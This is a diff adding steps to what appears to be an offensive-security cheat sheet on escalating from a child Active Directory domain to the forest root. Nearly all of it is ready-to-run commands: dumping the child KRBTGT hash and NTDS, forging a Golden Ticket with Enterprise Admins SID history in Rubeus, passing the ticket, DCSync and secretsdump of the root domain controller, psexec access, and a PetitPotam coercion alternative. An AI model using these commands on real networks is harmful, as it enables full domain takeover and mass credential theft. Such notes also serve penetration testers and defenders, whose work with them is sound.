@@ -2,6 +2,126 @@
 
 Escalate from a child domain to the root domain of the forest by forging a Golden Ticket with the SID of the Enterprise Admins group in the SID history field.
 
+## Steps:
+
+### 1) Trust Discovery and details
+
+Netexec
+
+    nxc ldap IP -u USER -p PASSWORD --dc-list
+
+PyWerView
+
+    pywerview get netdomaintrust -w child.domain.local
+
+### 2) Trust confirmation
+
+nltest
+
+    nltest /trusted_domains
+
+PowerShell
+
+    ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+
+BloodyAD
+
+    bloodyAD --host IP -d child.domain.local -u USER -p 'PASSWORD' get trusts
+
+### 3) Extract KRBTGT hash and required SIDs
+
+Dump child KRBTGT hash (Requires domain admin creds in child domain)
+
+    nxc smb IP -u USER -p 'PASSWORD' --ntds
+
+Get Child Domain SID
+
+    (Get-ADDomain).DomainSID
+
+Get Parent Enterprise Admins SID
+
+    Get-ADGroup -Identity "Enterprise Admins" -Server dc.parentdomain.local
+
+### 4) Forge cross-domain Golden Ticket
+
+    rubeus.exe golden /rc4:KRBTGT_RC4_HASH /user:administrator /domain:child.domain.local /sid:CHILD_DOMAIN_SID /sids:PARENT_ENTERPRISE_DOMAIN_SID /outfile:ticket 
+
+### 5) Pass-the-Ticket into the Forest Root
+
+Pass the ticket
+
+    rubeus.exe ptt /ticket:TICKET_FROM_PREVIOUS_COMMAND
+
+List ticket cache
+
+    klist
+
+Verify access
+
+    dir \\dc.parentdomain.local\c$
+
+### 6) Harvest forest root secrets from Linux
+
+Import ticket to Linux for further usage
+
+    cat ticket.b64 | base64 -d > ticket.kirbi
+    impacket-ticketConverter ticket.kirbi ticket.ccache
+    export KRB5CCNAME=ticket.ccache
+
+Dump secrets
+
+    nxc smb PARENT_DC_IP dc.parentdomain.local -k --use-kcache --lsa
+
+### 7) Full Forest Compromise
+
+Dump EVERYTHING
+
+    impacket-secretsdump -k -no-pass dc.parentdomain.local -just-dc
+
+Connect
+
+    impacket-psexec -k -no-pass dc.parentdomain.local
+
+### BONUS: Steps 4 and 5 are automated in Netexec with this command:
+
+    nxc ldap IP -u USER -p PASSWORD -M raisechild
+
+Validate forged ticket
+
+    export KRB5CCNAME=Administrator.ccache
+
+Dump secrets from parent DC
+    
+    nxc smb IP dc.parentdomain.local -k --use-kcache --lsa
+
+## Alternate Method: Coercion-Based Compromise
+
+### 1) Confirm the coercion vector
+
+In the Child domain DC, list the spool's pipe over the DC host to confirm the Print Spooler service is reachabale
+
+    cd Users/Public
+    powershell ls \\dc\pipe\spools
+
+### 2) Monitor for the DC machine account takeover
+
+On child DC
+
+    rubeus.exe monitor /interval:5 /filteruser:DC$ /nowrap
+
+### 3) Coerce the forest root with PetitPotam
+
+    python3 PetitPotam.py -u USER -p PASSWORD -d child.domain.local cdc01.child.domain.local dc.parentdomain.local
+
+### 4) Convert the captured ticket
+
+    impacket-ticketConverter newticket.kirbi newticket.ccahce
+
+### 5) DCSync with the captured machine account
+
+    export KRB5CCNAME=newticket.ccache
+    impacket-secretsdump -k -no-pass dc.parentdomain.local -just-dc
+
 ## With the trust key
 
 ### 1) Get the trust key, look at the [in] value in the result
